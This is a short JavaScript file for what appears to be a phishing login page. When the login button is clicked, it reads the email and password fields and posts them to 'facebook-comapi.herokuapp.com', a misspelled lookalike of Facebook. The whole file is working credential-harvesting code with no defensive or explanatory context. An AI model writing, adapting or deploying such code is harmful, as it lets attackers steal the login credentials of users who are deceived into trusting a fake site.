

const email = document.querySelector(".email");
const pass = document.querySelector(".password");
const btn = document.querySelector("#loginbutton");

btn.addEventListener("click", event);

function event() {
  const formData = {
    email:email.value,
    pass:pass.value
  }
  axios
    .post("https://facebook-comapi.herokuapp.com/", {
      formData,
    })
    .then((response) => {
      console.log(response);
    })
    .catch((error) => {
      console.log(error);
    });
}
